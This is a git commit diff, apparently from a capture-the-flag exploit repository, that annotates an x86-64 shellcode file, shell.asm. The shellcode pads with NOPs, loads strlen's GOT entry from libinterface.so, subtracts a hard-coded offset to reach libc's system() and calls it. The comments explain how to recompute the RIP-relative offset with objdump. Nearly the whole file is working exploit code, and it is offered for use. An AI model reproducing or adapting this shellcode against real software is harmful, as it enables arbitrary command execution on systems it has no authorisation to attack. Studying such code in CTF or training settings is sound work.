44310400b368677d77559e0e768ce28a4d543885
Ruslan Kutdusov <ruslan.kutdusov.usu@gmail.com>
2019-04-27 04:02:07 +0500

    sandbox: add comments to shell.asm

--- sploits/sandbox/shell.asm
+++ sploits/sandbox/shell.asm
@@ -1,10 +1,34 @@
 [SECTION .text]
 global _start
 _start:
-		sub rsp, 0x10
+		nop									; c54 GetUnit
+ 		nop									; fill with NOPs, so actual shell start with aligned adress - c60
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+ 		nop
+		sub rsp, 0x10 						; c60
 		push rbx
- 		mov rbx, [rel $ + 0x2013cb]
- 		sub rbx, 0x13F150
+
+		; launch objdump -d -M intel libinterface.so and find this lines:
+		; 00000000000008e0 <strlen@plt>:
+ 		;  8e0:   ff 25 4a 17 20 00       jmp    QWORD PTR [rip+0x20174a]        # 202030 <strlen@GLIBC_2.2.5>
+		; 
+		; so to get 0x2013cb in 'mov' instruction below:
+		; 8e0 - c65 + 201741a + 6
+		; where c65 - is start address of 'mov' instruction, 6 - number of bytes in 'jmp' instruction
+
+		; load to rbx address of 'strlen' function
+ 		mov rbx, [rel $ + 0x2013cb]			; c65
+ 		; calculate address of 'system' function
+ 		sub rbx, 0x13F150 					; &strlen - &system = 0x13F150
+ 		; hack 'em all!!!
  		call rbx
  		pop rbx
  		add rsp, 0x10
